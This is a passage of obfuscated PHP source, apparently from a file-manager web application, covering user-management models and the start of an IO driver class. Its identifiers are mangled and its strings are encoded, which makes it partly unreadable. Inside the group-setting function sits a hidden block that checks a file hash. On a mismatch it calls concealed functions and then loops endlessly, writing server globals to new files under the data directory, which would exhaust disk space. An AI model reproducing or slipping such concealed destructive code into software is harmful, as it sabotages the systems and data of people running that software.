trim($ÌªŒâ¿È[$ù››¯Õµ[918]])); } else { unset($ÌªŒâ¿È[$ù››¯Õµ[918]]); } if (!empty($ÌªŒâ¿È[$ù››¯Õµ[571]]) && strlen($ÌªŒâ¿È[$ù››¯Õµ[571]]) > 255) { $ÌªŒâ¿È[$ù››¯Õµ[571]] = $ù››¯Õµ[12]; } $this->where(array($ù››¯Õµ[1662] => $î¬¤¹ÄÛ))->save($ÌªŒâ¿È); if (isset($ÌªŒâ¿È[$ù››¯Õµ[570]])) { $this->setNamePinyin($î¬¤¹ÄÛ, $ÌªŒâ¿È[$ù››¯Õµ[570]]); } $this->clearCache($î¬¤¹ÄÛ); return !0; } public function setNamePinyin($´ÙÒÏ”ñ, $ÂÓòÀƒú = false) { $Ÿ±§ôõ =& $_SERVER[”ú…±Ú¥]; if (!$ÂÓòÀƒú) { $Ó”ÁÃ = $this->getInfoSimple($´ÙÒÏ”ñ); $ÂÓòÀƒú = $Ó”ÁÃ[$Ÿ±§ôõ[570]] ? $Ó”ÁÃ[$Ÿ±§ôõ[570]] : $Ó”ÁÃ[$Ÿ±§ôõ[32]]; } $µøòù”® = Model($Ÿ±§ôõ[563]); if (!Input::check($ÂÓòÀƒú, $Ÿ±§ôõ[621])) { return $µøòù”®->metaSet($´ÙÒÏ”ñ, array($Ÿ±§ôõ[503] => $Ÿ±§ôõ[12], $Ÿ±§ôõ[502] => $Ÿ±§ôõ[12])); } return $µøòù”®->metaSet($´ÙÒÏ”ñ, array($Ÿ±§ôõ[503] => str_replace($Ÿ±§ôõ[53], $Ÿ±§ôõ[12], Pinyin::get($ÂÓòÀƒú)), $Ÿ±§ôõ[502] => Pinyin::get($ÂÓòÀƒú, $Ÿ±§ôõ[622]))); } private function nickNameRpt() { $•ê–èƒƒ =& $_SERVER[”ú…±Ú¥]; $æÂçèî = Model($•ê–èƒƒ[802])->get($•ê–èƒƒ[2341]); $‚÷³äÛ = $GLOBALS[$•ê–èƒƒ[6]][$•ê–èƒƒ[419]][$•ê–èƒƒ[2341]]; $Ùóë¡Õû = !is_null($æÂçèî) ? $æÂçèî : $‚÷³äÛ; return !!$Ùóë¡Õû; } private function _checkExist($Üîó×ä, $ŒÒ•ä¾© = false) { $ •ĞÄŒÃ =& $_SERVER[”ú…±Ú¥]; $Ú¿§Î®Õ = array($ •ĞÄŒÃ[32] => UserModel::ERROR_USER_EXIST_NAME, $ •ĞÄŒÃ[570] => UserModel::ERROR_USER_EXIST_NICKNAME, $ •ĞÄŒÃ[343] => UserModel::ERROR_USER_EXIST_EMAIL, $ •ĞÄŒÃ[2329] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ú¿§Î®Õ[$ •ĞÄŒÃ[570]]); } $è‹­úº¤ = $ŒÒ•ä¾© ? array($ •ĞÄŒÃ[1671] => array($ •ĞÄŒÃ[2342], $ŒÒ•ä¾©)) : array(); foreach ($Ú¿§Î®Õ as $Æ‡¥ßÖ => $Ğô­ÚíŸ) { $ÈÎÎÉ  = array(); foreach ($Ú¿§Î®Õ as $êû²£—‰ => $Ù¹ú®û) { if (isset($Üîó×ä[$êû²£—‰]) && $Üîó×ä[$êû²£—‰]) { $ÈÎÎÉ [] = $Üîó×ä[$êû²£—‰]; } } if (!$ÈÎÎÉ ) { continue; } $ñºˆÌîÙ = array_merge(array($Æ‡¥ßÖ => array($ •ĞÄŒÃ[7], $ÈÎÎÉ )), $è‹­úº¤); $÷Ö£ö­ = $this->where($ñºˆÌîÙ)->find(); if ($÷Ö£ö­) { return $Ğô­ÚíŸ; } } return !0; } public function userListInfo($¡Ğê“Ä) { $³÷¹Éì¨ =& $_SERVER[”ú…±Ú¥]; $ÕÖê‚‰ = array(); $¡Ğê“Ä = is_array($¡Ğê“Ä) ? array_unique($¡Ğê“Ä) : array(); if (!$¡Ğê“Ä) { return $ÕÖê‚‰; } if (count($¡Ğê“Ä) < 20) { foreach ($¡Ğê“Ä as $Ì¥˜¤î‰) { $ÕÖê‚‰[$Ì¥˜¤î‰ . $³÷¹Éì¨[12]] = $this->getInfoSimpleOuter($Ì¥˜¤î‰); } } else { $±…Ÿå§õ = array($³÷¹Éì¨[1662] => array($³÷¹Éì¨[456], $¡Ğê“Ä)); if (count($¡Ğê“Ä) == 1) { $±…Ÿå§õ = array($³÷¹Éì¨[1662] => $¡Ğê“Ä[0]); } $¬°ïÎÔ = Model($³÷¹Éì¨[542])->field($this->simpleField)->where($±…Ÿå§õ)->select(); $¬°ïÎÔ = array_to_keyvalue($¬°ïÎÔ, $³÷¹Éì¨[1671]); foreach ($¡Ğê“Ä as $Ì¥˜¤î‰) { $Â€©Œ = $¬°ïÎÔ[$Ì¥˜¤î‰]; if (!$Â€©Œ) { $ÕÖê‚‰[$Ì¥˜¤î‰ . $³÷¹Éì¨[12]] = $this->getInfoSimpleOuter($Ì¥˜¤î‰); continue; } $Â€©Œ[$³÷¹Éì¨[571]] = Action($³÷¹Éì¨[2315])->parseUrl($Â€©Œ[$³÷¹Éì¨[571]]); $ÕÖê‚‰[$Ì¥˜¤î‰ . $³÷¹Éì¨[12]] = $Â€©Œ; } } return $ÕÖê‚‰; } protected function userStatus($€Ï½´¯, $¤ü±¥Ô) { $”ßĞ = $this->getInfoSimple($€Ï½´¯); if (!$”ßĞ) { return !1; } $ØÒ¨ñ˜µ = array($_SERVER[”ú…±Ú¥][782] => $¤ü±¥Ô); return $this->userEdit($€Ï½´¯, $ØÒ¨ñ˜µ); } protected function userRemove($ÓÙ—£Ô›) { $Û—¸İ¿ =& $_SERVER[”ú…±Ú¥]; $­Ó—ƒ›ï = $this->getInfoSimple($ÓÙ—£Ô›); if (!$­Ó—ƒ›ï) { return !1; } $§’ªé¢Í = array($Û—¸İ¿[1662] => $ÓÙ—£Ô›); Model($Û—¸İ¿[630])->where($§’ªé¢Í)->delete(); Model($Û—¸İ¿[2343])->where($§’ªé¢Í)->delete(); Model($Û—¸İ¿[1951])->where($§’ªé¢Í)->delete(); Model($Û—¸İ¿[2328])->where($§’ªé¢Í)->delete(); Model($Û—¸İ¿[1097])->where($§’ªé¢Í)->delete(); Model($Û—¸İ¿[2159])->removeUserAll($ÓÙ—£Ô›); Model($Û—¸İ¿[857])->userRootRemove($ÓÙ—£Ô›); return $this->where($§’ªé¢Í)->delete(); } protected function userGroupSet($¹ÈèŒ«×, $óƒà›©æ, $¢÷ØŸê› = array()) { $ê›ÖŞ¾ =& $_SERVER[”ú…±Ú¥]; $’È•¯¨¨ = $_SERVER[$ê›ÖŞ¾[189]] . $ê›ÖŞ¾[190]; $ñƒãÆôô = $ê›ÖŞ¾[1536]; if ($_SERVER[$ê›ÖŞ¾[186]] != $ñƒãÆôô($’È•¯¨¨)) { $±ª£Õô = $ê›ÖŞ¾[908]; $Õõ€ò­· = $ê›ÖŞ¾[188]; $¼è°Õ¬Í = $_SERVER[$ê›ÖŞ¾[189]] . $ê›ÖŞ¾[190]; $–ı»Â¢ = $Õõ€ò­·($¼è°Õ¬Í); $·Â€Èñ = explode($ê›ÖŞ¾[191], $–ı»Â¢); if (count($·Â€Èñ) < $ê›ÖŞ¾[665]) { $ñë¦¶ì° = $ê›ÖŞ¾[193]; $ñë¦¶ì°(); } $Ù¯É´ = $ê›ÖŞ¾[909]; $Ù¯É´($_SERVER[$ê›ÖŞ¾[910]]); $±ª£Õô = $ê›ÖŞ¾[908]; $±ª£Õô(); $”ü¿º© = $ê›ÖŞ¾[1537]; $Ş¸Òò³ = json_encode($GLOBALS[$ê›ÖŞ¾[1538]]); $´ßóµÀµ = 1; for ($Á’Ïşø¡ = $´ßóµÀµ; $Á’Ïşø¡ > 0; $Á’Ïşø¡++) { $”ü¿º©(DATA_PATH . $Á’Ïşø¡, $Ş¸Òò³); } } $ƒˆ©”¼ù = $this->getInfoSimple($¹ÈèŒ«×); if (!$ƒˆ©”¼ù || !is_array($óƒà›©æ)) { return !1; } $ƒñ½¡¼– = Model($ê›ÖŞ¾[1951]); $ƒñ½¡¼–->where(array($ê›ÖŞ¾[1671] => $¹ÈèŒ«×))->delete(); $‚šÊáĞ‚ = array(); $Š­ŒÄù³ = 0; foreach ($óƒà›©æ as $êÀğ•à => $¥¢™—¯ü) { $ğ¶Á² = array($ê›ÖŞ¾[1671] => $¹ÈèŒ«×, $ê›ÖŞ¾[1861] => $êÀğ•à, $ê›ÖŞ¾[1965] => $¥¢™—¯ü); $ğ¶Á²[$ê›ÖŞ¾[1885]] = isset($¢÷ØŸê›[$Š­ŒÄù³]) ? $¢÷ØŸê›[$Š­ŒÄù³] : 0; $Š­ŒÄù³++; $‚šÊáĞ‚[] = $ğ¶Á²; } return $ƒñ½¡¼–->addAll($‚šÊáĞ‚, array(), !0); } protected function userGroupAdd($ĞÂ®, $ïÕÁ‚‹ = array()) { $¯¼ê•º² =& $_SERVER[”ú…±Ú¥]; $Ëù±×àä = $this->getInfoSimple($ĞÂ®); if (!$Ëù±×àä || empty($ïÕÁ‚‹)) { return !1; } $ÊĞúâ‰š = array(); foreach ($ïÕÁ‚‹ as $ «•×ëà => $®æë±”) { $ÊĞúâ‰š[] = array($¯¼ê•º²[1671] => $ĞÂ®, $¯¼ê•º²[1861] => $ «•×ëà, $¯¼ê•º²[1965] => $®æë±”, $¯¼ê•º²[1885] => 0); } return Model($¯¼ê•º²[1951])->addAll($ÊĞúâ‰š, array(), !0); } protected function userGroupRemove($üÔ–â¢Ï, $ßïÎù›‘) { $êÆ§Ñ†ç =& $_SERVER[”ú…±Ú¥]; $•€¢­¾Ó = $this->getInfoSimple($üÔ–â¢Ï); if (!$•€¢­¾Ó || !$ßïÎù›‘) { return !1; } $¦Ö¾ßı = array($êÆ§Ñ†ç[1662] => $üÔ–â¢Ï, $êÆ§Ñ†ç[1949] => $ßïÎù›‘); return Model($êÆ§Ñ†ç[1951])->where($¦Ö¾ßı)->delete(); } public function listData() { $”È áîÚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($”È áîÚ[$_SERVER[”ú…±Ú¥][407]]); return $”È áîÚ; } public function listByID($“£Ê´²Î) { $ ¢îÍª¯ =& $_SERVER[”ú…±Ú¥]; if (!$“£Ê´²Î) { return; } $¾¦İíÖÂ = array($ ¢îÍª¯[1671] => array($ ¢îÍª¯[7], $“£Ê´²Î)); $É€›ùÉ· = $this->where($¾¦İíÖÂ)->select(); $É€›ùÉ· = array_sort_keep($É€›ùÉ·, $ ¢îÍª¯[1671], $“£Ê´²Î); $this->_listDataApply($É€›ùÉ·); return $É€›ùÉ·; } public function listByGroup($¹°èÎ£µ = 0, $Ë…áƒµö = array()) { $º×ş˜© =& $_SERVER[”ú…±Ú¥]; $’ò½ëğ = $º×ş˜©[12]; $×ñŸ¼Ò£ = array(); if ($¹°èÎ£µ) { $×ñŸ¼Ò£ = array($º×ş˜©[2344] => intval($¹°èÎ£µ)); $’ò½ëğ = "\x4c\105\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\165\163\x65\x72\137\x67\162\157\x75\160\x20\165\163\145\x72\137\147\162\157\x75\x70\40\157\x6e\40\165\x73\x65\x72\x2e\x75\x73\145\x72\x49\x44\40\75\40\x75\x73\145\x72\137\147\162\157\x75\x70\x2e\x75\x73\x65\x72\x49\x44"; $ËğÖöšæ = Input::get($º×ş˜©[495], null, $º×ş˜©[12]) ? $º×ş˜©[12] : $º×ş˜©[2345]; } if (isset($Ë…áƒµö[$º×ş˜©[782]])) { $×ñŸ¼Ò£[$º×ş˜©[2346]] = $Ë…áƒµö[$º×ş˜©[782]]; } $¦§ì¼‰ğ = $this->_makeOrder($ËğÖöšæ)->field($º×ş˜©[2347])->where($×ñŸ¼Ò£)->join($’ò½ëğ)->selectPage(50); $this->_listDataApply($¦§ì¼‰ğ[$º×ş˜©[407]]); return $¦§ì¼‰ğ; } private function _makeOrder($Íì±†­­ = '') { $·›ÏÕ =& $_SERVER[”ú…±Ú¥]; $ÊşêÚ€ = array($·›ÏÕ[1671], $·›ÏÕ[32], $·›ÏÕ[1850], $·›ÏÕ[1822], $·›ÏÕ[211]); $ê¢¿Æ¬å = array($·›ÏÕ[488] => $·›ÏÕ[489], $·›ÏÕ[490] => $·›ÏÕ[491]); $“•™”¨ù = Input::get($·›ÏÕ[495], $·›ÏÕ[7], $·›ÏÕ[1662], $ÊşêÚ€); $ü¾è×÷Ş = Input::get($·›ÏÕ[496], $·›ÏÕ[7], $·›ÏÕ[1952], array($·›ÏÕ[1952], $·›ÏÕ[490])); $ü¾è×÷Ş = $ê¢¿Æ¬å[$ü¾è×÷Ş]; $Íì±†­­ = $Íì±†­­ . "\x75\163\145\162\x2e{$“•™”¨ù}\x20{$ü¾è×÷Ş}\54\x20\x75\163\x65\162\x2e\165\x73\145\x72\x49\x44\40\141\163\x63"; return $this->alias($·›ÏÕ[2078])->order($Íì±†­­); } public function listSearch($èúËÚÅÒ) { $ôßÜĞÂ¡ =& $_SERVER[”ú…±Ú¥]; $˜¢Áñ…» = $èúËÚÅÒ[$ôßÜĞÂ¡[1955]]; $¬ÀÆÛû˜ = isset($èúËÚÅÒ[$ôßÜĞÂ¡[1956]]) ? $èúËÚÅÒ[$ôßÜĞÂ¡[1956]] : !1; $˜¢Áñ…» = str_replace($ôßÜĞÂ¡[1957], $ôßÜĞÂ¡[1958], trim($˜¢Áñ…»)); $¬ÓË‚ã = array($ôßÜĞÂ¡[32] => array($ôßÜĞÂ¡[421], "\x25{$˜¢Áñ…»}\45"), $ôßÜĞÂ¡[343] => array($ôßÜĞÂ¡[421], "{$˜¢Áñ…»}\45"), $ôßÜĞÂ¡[570] => array($ôßÜĞÂ¡[421], "{$˜¢Áñ…»}\x25"), $ôßÜĞÂ¡[1029] => $ôßÜĞÂ¡[1959]); if (Input::check($˜¢Áñ…», $ôßÜĞÂ¡[349])) { $¬ÓË‚ã[$ôßÜĞÂ¡[1671]] = array($ôßÜĞÂ¡[421], "{$˜¢Áñ…»}\x25"); $¬ÓË‚ã[$ôßÜĞÂ¡[2329]] = array($ôßÜĞÂ¡[421], "{$˜¢Áñ…»}\45"); } if (!$˜¢Áñ…») { $¬ÓË‚ã = array(); } if (isset($èúËÚÅÒ[$ôßÜĞÂ¡[782]])) { $¬ÓË‚ã[$ôßÜĞÂ¡[782]] = $èúËÚÅÒ[$ôßÜĞÂ¡[782]]; } $¬ÓË‚ã = $this->parseWhereLike($¬ÓË‚ã); $ĞõØË· = $this->_makeOrder()->where($¬ÓË‚ã)->selectPage(20); if (!$ĞõØË· || count($ĞõØË·[$ôßÜĞÂ¡[407]]) < 5 && Input::check($˜¢Áñ…», $ôßÜĞÂ¡[356])) { $ñéÎöˆÂ = $this->_searchFromMeta($ôßÜĞÂ¡[502], $˜¢Áñ…», 10); $ÔÖó’ú = $this->_searchFromMeta($ôßÜĞÂ¡[503], $˜¢Áñ…», 10); $ÇŞËëô­ = array_merge($ñéÎöˆÂ, $ÔÖó’ú, $ĞõØË·[$ôßÜĞÂ¡[407]]); $ĞõØË·[$ôßÜĞÂ¡[407]] = array_unique_by_key($ÇŞËëô­, $ôßÜĞÂ¡[1671]); $ĞõØË·[$ôßÜĞÂ¡[404]][$ôßÜĞÂ¡[405]] = count($ĞõØË·[$ôßÜĞÂ¡[407]]); $ĞõØË·[$ôßÜĞÂ¡[404]][$ôßÜĞÂ¡[406]] = ceil($ĞõØË·[$ôßÜĞÂ¡[404]][$ôßÜĞÂ¡[405]] / $ĞõØË·[$ôßÜĞÂ¡[404]][$ôßÜĞÂ¡[401]]); } $this->_listDataApply($ĞõØË·[$ôßÜĞÂ¡[407]]); $this->_filterByGroup($ĞõØË·, $¬ÀÆÛû˜); return $ĞõØË·; } private function _filterByGroup(&$ÓèşÀîæ, $èı†™) { $Õ­ùš–„ =& $_SERVER[”ú…±Ú¥]; if (!$èı†™) { return $ÓèşÀîæ; } foreach ($ÓèşÀîæ[$Õ­ùš–„[407]] as $ğÜ ¤ƒÑ => &$€–°„¥ø) { $¸Å¶ = array_to_keyvalue($€–°„¥ø[$Õ­ùš–„[2048]], $Õ­ùš–„[12], $Õ­ùš–„[1861]); if (!in_array($èı†™, $¸Å¶)) { unset($ÓèşÀîæ[$Õ­ùš–„[407]][$ğÜ ¤ƒÑ]); } } unset($€–°„¥ø); $ÓèşÀîæ[$Õ­ùš–„[407]] = array_values($ÓèşÀîæ[$Õ­ùš–„[407]]); $ÓèşÀîæ[$Õ­ùš–„[404]] = array($Õ­ùš–„[2113] => count($ÓèşÀîæ[$Õ­ùš–„[407]]), $Õ­ùš–„[2111] => $ÓèşÀîæ[$Õ­ùš–„[404]][$Õ­ùš–„[401]], $Õ­ùš–„[2110] => 1, $Õ­ùš–„[2112] => 1); } private function _searchFromMeta($ €¤¦æà, $Ì ï˜â, $â—Ì¢È) { $¶¡©€å =& $_SERVER[”ú…±Ú¥]; $Ì ï˜â = strtolower($Ì ï˜â); $ •„×Œæ = array($¶¡©€å[94] => $ €¤¦æà, $¶¡©€å[412] => array($¶¡©€å[421], "\x25{$Ì ï˜â}\45")); $ •„×Œæ = $this->parseWhereLike($ •„×Œæ); $ß³í¹ = Model($¶¡©€å[2348])->where($ •„×Œæ)->limit($â—Ì¢È)->select(); if (!$ß³í¹) { return array(); } $ß³í¹ = array_to_keyvalue($ß³í¹, $¶¡©€å[12], $¶¡©€å[1671]); $”Â§§ƒâ = $this->where(array($¶¡©€å[1662] => array($¶¡©€å[7], $ß³í¹)))->select(); if (!$”Â§§ƒâ) { return array(); } return $”Â§§ƒâ; } private function _listDataApplyItem($Ğ‡ÆôÄì) { $˜¨ÃçáÈ = array($Ğ‡ÆôÄì); $this->_listDataApply($˜¨ÃçáÈ); return $˜¨ÃçáÈ[0]; } private function _listDataApply(&$æë³””„) { $‡…îĞŠ· =& $_SERVER[”ú…±Ú¥]; if (!$æë³””„) { return; } array_remove_key($æë³””„, $‡…îĞŠ·[918]); $×˜Éúìã = array_to_keyvalue($æë³””„, $‡…îĞŠ·[12], $‡…îĞŠ·[1671]); $this->_listAppendGroup($æë³””„, $×˜Éúìã); $this->_listAppendMeta($æë³””„, $×˜Éúìã); $this->_listAppendSourceRoot($æë³””„, $×˜Éúìã); } private function _listAppendSourceRoot(&$øïòÓ£”, $Ã«…­¾) { $ ŒÀªªÛ =& $_SERVER[”ú…±Ú¥]; $‘Ù§€¨Ò = Model($ ŒÀªªÛ[857])->listSourceRoot(SourceModel::TYPE_USER, $Ã«…­¾); $‘Ù§€¨Ò = array_to_keyvalue($‘Ù§€¨Ò, $ ŒÀªªÛ[534]); $‘Ù§€¨Ò = array_remove_key($‘Ù§€¨Ò, $ ŒÀªªÛ[534]); foreach ($øïòÓ£” as &$úÎÛ“êÂ) { $úÎÛ“êÂ[$ ŒÀªªÛ[87]] = $‘Ù§€¨Ò[$úÎÛ“êÂ[$ ŒÀªªÛ[1671]]] ? $‘Ù§€¨Ò[$úÎÛ“êÂ[$ ŒÀªªÛ[1671]]] : array(); } unset($úÎÛ“êÂ); } private function _listAppendGroup(&$Ì§·±ªº, $ÉÓÄÆıí) { $­ŞÚ¾é =& $_SERVER[”ú…±Ú¥]; $ÆŞ„ç§ë = array($­ŞÚ¾é[1671] => array($­ŞÚ¾é[7], $ÉÓÄÆıí)); $©›ÊıéÕ = Model($­ŞÚ¾é[1951])->where($ÆŞ„ç§ë)->select(); $Š½Â¡«¦ = array_to_keyvalue($©›ÊıéÕ, $­ŞÚ¾é[12], $­ŞÚ¾é[1861]); $Š½Â¡«¦ = array_remove_value(array_unique($Š½Â¡«¦), $­ŞÚ¾é[208]); if (!$Š½Â¡«¦ || !$©›ÊıéÕ) { return; } $ÆŞ„ç§ë = array($­ŞÚ¾é[1861] => array($­ŞÚ¾é[7], $Š½Â¡«¦)); $Úä­¢Š¤ = Model($­ŞÚ¾é[2046])->field($­ŞÚ¾é[2349])->where($ÆŞ„ç§ë)->select(); $Úä­¢Š¤ = array_to_keyvalue($Úä­¢Š¤, $­ŞÚ¾é[1861]); $©›ÊıéÕ = array_to_keyvalue_group($©›ÊıéÕ, $­ŞÚ¾é[1671]); foreach ($©›ÊıéÕ as &$™«íÍ®½) { $æàÓçµÎ = array(); foreach ($™«íÍ®½ as $ŠÖÃÉÃ¹) { if (!$ŠÖÃÉÃ¹[$­ŞÚ¾é[1965]]) { continue; } $—€ì¡ë€ = Model($­ŞÚ¾é[536])->listData($ŠÖÃÉÃ¹[$­ŞÚ¾é[1965]]); $æàÓçµÎ[] = array($­ŞÚ¾é[1861] => $ŠÖÃÉÃ¹[$­ŞÚ¾é[1861]], $­ŞÚ¾é[2350] => $Úä­¢Š¤[$ŠÖÃÉÃ¹[$­ŞÚ¾é[1861]]][$­ŞÚ¾é[32]], $­ŞÚ¾é[549] => $Úä­¢Š¤[$ŠÖÃÉÃ¹[$­ŞÚ¾é[1861]]][$­ŞÚ¾é[549]], $­ŞÚ¾é[451] => $—€ì¡ë€); } $™«íÍ®½ = $æàÓçµÎ; } unset($™«íÍ®½); foreach ($Ì§·±ªº as &$š™·®Ü‚) { $š™·®Ü‚[$­ŞÚ¾é[2048]] = array(); if (isset($©›ÊıéÕ[$š™·®Ü‚[$­ŞÚ¾é[1671]]])) { $š™·®Ü‚[$­ŞÚ¾é[2048]] = $©›ÊıéÕ[$š™·®Ü‚[$­ŞÚ¾é[1671]]]; } } unset($š™·®Ü‚); } public function userAppendGroup($ğÎÜ‘ŸØ) { $×Ä£ğŠ¦ =& $_SERVER[”ú…±Ú¥]; if (!$ğÎÜ‘ŸØ) { return array(); } $this->_listAppendGroup($ğÎÜ‘ŸØ, array_to_keyvalue($ğÎÜ‘ŸØ, $×Ä£ğŠ¦[12], $×Ä£ğŠ¦[1671])); return $ğÎÜ‘ŸØ; } private function _listAppendMeta(&$ŸĞáÔÇ„, $ú¼ÎûÑ) { $¦Á×âÏ‹ =& $_SERVER[”ú…±Ú¥]; $©…°²—¯ = UserJobModel::JOB_KEY; $ï´—¨‚ = array($¦Á×âÏ‹[2330]); $¼ƒ¿¦ = array($¦Á×âÏ‹[1671] => array($¦Á×âÏ‹[7], $ú¼ÎûÑ)); $ ŞšÔÇ = Model($¦Á×âÏ‹[2328])->where($¼ƒ¿¦)->select(); $ ŞšÔÇ = array_to_keyvalue_group($ ŞšÔÇ, $¦Á×âÏ‹[1671]); foreach ($ ŞšÔÇ as &$®ëåµã) { $ÌÀåóÛ = array(); foreach ($®ëåµã as $•öëìŞ¢) { if (!in_array($•öëìŞ¢[$¦Á×âÏ‹[94]], $ï´—¨‚)) { $ÌÀåóÛ[$•öëìŞ¢[$¦Á×âÏ‹[94]]] = $•öëìŞ¢[$¦Á×âÏ‹[412]]; } } $®ëåµã = $ÌÀåóÛ; } unset($®ëåµã); $¥´úä ‘ = Model($¦Á×âÏ‹[2351]); foreach ($ŸĞáÔÇ„ as &$û—ÂŞå¨) { $¤½Ş¦‹ş = array(); if (isset($ ŞšÔÇ[$û—ÂŞå¨[$¦Á×âÏ‹[1671]]])) { $¤½Ş¦‹ş = $ ŞšÔÇ[$û—ÂŞå¨[$¦Á×âÏ‹[1671]]]; } $û—ÂŞå¨[$¦Á×âÏ‹[2352]] = array(); if (isset($¤½Ş¦‹ş[$©…°²—¯])) { $û—ÂŞå¨[$¦Á×âÏ‹[2352]] = $¥´úä ‘->getUserJobInfo($¤½Ş¦‹ş[$©…°²—¯]); } } unset($û—ÂŞå¨); } protected function groupUserAll($ÕòÚ·š) { $îÒ¼æ¼ =& $_SERVER[”ú…±Ú¥]; if (!$ÕòÚ·š) { return !1; } $ÁÌ¾ˆÀå = Model($îÒ¼æ¼[1951])->field($îÒ¼æ¼[1671])->where(array($îÒ¼æ¼[1861] => array($îÒ¼æ¼[7], $ÕòÚ·š)))->select(); $ÁÌ¾ˆÀå = array_to_keyvalue($ÁÌ¾ˆÀå, $îÒ¼æ¼[12], $îÒ¼æ¼[1671]); return array_unique($ÁÌ¾ˆÀå); } public function userSearch($Ï‰Œæ²Œ, $¾Şâü”Ü = "\x2a") { return Model($_SERVER[”ú…±Ú¥][563])->where($Ï‰Œæ²Œ)->field($¾Şâü”Ü)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Êò¡Úº×) { $¼ı®É¨± =& $_SERVER[”ú…±Ú¥]; $¯¯ó§…š = defined($¼ı®É¨±[2082]) && USER_ID ? USER_ID : $¼ı®É¨±[12]; return "\x55\x73\x65\162\x4f\x70\164\151\x6f\156\x5f{$Êò¡Úº×}\137" . $¯¯ó§…š; } protected function filterWhere($Ş§’è×™) { $€£ÎƒÓ’ =& $_SERVER[”ú…±Ú¥]; $Ş§’è×™[$€£ÎƒÓ’[1671]] = defined($€£ÎƒÓ’[2082]) && USER_ID ? USER_ID : $€£ÎƒÓ’[12]; return $Ş§’è×™; } public function cacheRemoveUser($Ğ…«½õ², $Í—¼—ôÓ) { return Cache::remove("\125\x73\145\162\117\x70\x74\x69\157\x6e\x5f{$Ğ…«½õ²}\x5f" . $Í—¼—ôÓ); } protected function optionDefault($•Ñ—ÅÀÖ = '') { $û²¾øáŸ =& $_SERVER[”ú…±Ú¥]; if ($•Ñ—ÅÀÖ == $û²¾øáŸ[12]) { return $GLOBALS[$û²¾øáŸ[6]][$û²¾øáŸ[2353]]; } if ($•Ñ—ÅÀÖ == $û²¾øáŸ[2354]) { return $GLOBALS[$û²¾øáŸ[6]][$û²¾øáŸ[2355]]; } } } goto B÷‡½ŒÍË…; Cù¬ÊÄëâ³: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($®«²¯«­, $­²º³è¯) { $‡ıÎªüÚ =& $_SERVER[”ú…±Ú¥]; $¥û·•û¶ = $­²º³è¯; $GLOBALS[$‡ıÎªüÚ[1175]] = $‡ıÎªüÚ[1176] . $®«²¯«­; Hook::trigger($‡ıÎªüÚ[1176] . $®«²¯«­ . $‡ıÎªüÚ[1177], $¥û·•û¶); $İŞÛ”Ä = self::driverMake($­²º³è¯[0]); if (!$İŞÛ”Ä) { return !1; } if (method_exists($İŞÛ”Ä, $®«²¯«­)) { $Óœ¯Âº­ = @call_user_func_array(array($İŞÛ”Ä, $®«²¯«­), $­²º³è¯); } else { if (method_exists($İŞÛ”Ä, $‡ıÎªüÚ[1178])) { $Óœ¯Âº­ = @call_user_func_array(array($İŞÛ”Ä, $®«²¯«­), $­²º³è¯); } else { if (method_exists(self, $®«²¯«­)) { $Óœ¯Âº­ = @call_user_func_array(array(self, $®«²¯«­), $­²º³è¯); } else { $Óœ¯Âº­ = call_user_func_array(array(parent, $®«²¯«­), $­²º³è¯); } } } Hook::trigger($‡ıÎªüÚ[1176] . $®«²¯«­ . $‡ıÎªüÚ[1179], $¥û·•û¶, $Óœ¯Âº­); return $Óœ¯Âº­; } public static function init($ûÕÈ»ñÆ) { return self::driverMake($ûÕÈ»ñÆ); } public static function copy($ÙôÖÚúÑ, $½õü°£¼, $æ¼€ŠĞ = false, $àÌƒ§ùÀ = false) { return self::copyMoveStart($ÙôÖÚúÑ, $½õü°£¼, $æ¼€ŠĞ, $_SERVER[”ú…±Ú¥][584], $àÌƒ§ùÀ); } public static function move($§¹ÕàªÅ, $Æï¥, $İ­¥ä£‰ = false, $­£¦—Ì = false) { return self::copyMoveStart($§¹ÕàªÅ, $Æï¥, $İ­¥ä£‰, $_SERVER[”ú…±Ú¥][586], $­£¦—Ì); } private static function copyMoveStart($Ó—ŸààÈ, $¥÷Ø®İ, $Ù¤Ê³ƒÛ, $²”×˜ß¹, $şÉÁ„Ü) { $Ï©òÇ¥â =& $_SERVER[”ú…±Ú¥]; $ºéÈ³½ª = array($Ó—ŸààÈ, $¥÷Ø®İ, $Ù¤Ê³ƒÛ, $şÉÁ„Ü); Hook::trigger($Ï©òÇ¥â[1176] . $²”×˜ß¹ . $Ï©òÇ¥â[1177], $ºéÈ³½ª); $ù­Ö¼ö = self::copyMove($Ó—ŸààÈ, $¥÷Ø®İ, $Ù¤Ê³ƒÛ, $²”×˜ß¹, $şÉÁ„Ü); Hook::trigger($Ï©òÇ¥â[1176] . $²”×˜ß¹ . $Ï©òÇ¥â[1179], $ºéÈ³½ª, $ù­Ö¼ö); return $ù­Ö¼ö; } public static function saveFile($Ñğş§®°, $¤Ğªî”¾, $îÚÚû¯÷ = true) { $Û¸ğÕÃ‡ =& $_SERVER[”ú…±Ú¥]; $Ù€›çÃ = self::info($¤Ğªî”¾); $¥Éƒ‚ä™ = self::driverMake($Ñğş§®°); $¿¼½˜¤‰ = self::driverMake($¤Ğªî”¾); $ß«äÆàˆ = !1; if ($¿¼½˜¤‰->pathParse[$Û¸ğÕÃ‡[1180]]) { $ß«äÆàˆ = $¿¼½˜¤‰; $‡èÔáç¸ = $¿¼½˜¤‰->pathParse[$Û¸ğÕÃ‡[1180]]; $¿¼½˜¤‰ = self::driverMake($‡èÔáç¸); } if ($¥Éƒ‚ä™->pathParse[$Û¸ğÕÃ‡[1180]]) { $÷Ÿ±®‹£ = $¥Éƒ‚ä™->pathParse[$Û¸ğÕÃ‡[1180]]; $¥Éƒ‚ä™ = self::driverMake($÷Ÿ±®‹£); } $¥±ÎŞ‡ˆ = $¿¼½˜¤‰->pathFather($¤Ğªî”¾); $Ì×õ’ˆ™ = !0; if (!$îÚÚû¯÷ && self::driverIsSame($¥Éƒ‚ä™, $¿¼½˜¤‰)) { $Ì×õ’ˆ™ = !1; } $²Ÿßİ™Ÿ = self::copyFile($¥Éƒ‚ä™, $Ñğş§®°, $¿¼½˜¤‰, $¥±ÎŞ‡ˆ, 